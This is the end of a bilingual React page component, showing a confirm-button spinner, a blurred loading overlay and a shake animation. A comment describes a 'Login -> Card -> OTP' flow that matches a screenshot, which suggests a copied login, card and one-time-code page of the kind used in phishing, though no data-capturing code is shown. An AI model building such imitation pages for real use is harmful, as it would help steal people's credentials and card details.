                        r="10"
                        stroke="currentColor"
                        strokeWidth="4"
                      />
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                      />
                    </svg>
                    <span>{language === "es" ? "CONFIRMANDO..." : "CONFIRMING..."}</span>
                  </div>
                ) : language === "es" ? (
                  "Confirmar"
                ) : (
                  "Confirm"
                )}
              </button>
            </div>
          </section>
        </main>
      )}

      {/* ========================================================================= */}
      {/* 2-SECOND BLURRED LOADING OVERLAY (MATCHING SCREENSHOT 1)                  */}
      {/* Active on transition: Login -> Card and Card -> OTP                       */}
      {/* ========================================================================= */}
      {isScreenLoading && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#f8e8f2]/70 backdrop-blur-md animate-in fade-in duration-200">
          <div
            className="w-[44px] h-[44px] rounded-full border-[3.5px] animate-spin"
            style={{
              borderColor: "rgba(152, 15, 101, 0.2)",
              borderTopColor: "#980F65",
            }}
          />
        </div>
      )}

      {/* Shake Keyframe animation */}
      <style jsx global>{`
        @keyframes shake {
          10%, 90% { transform: translate3d(-1px, 0, 0); }
          20%, 80% { transform: translate3d(2px, 0, 0); }
          30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
          40%, 60% { transform: translate3d(4px, 0, 0); }
        }
        .animate-shake {
          animation: shake 0.4s cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
        }
      `}</style>
    </div>
  )
}
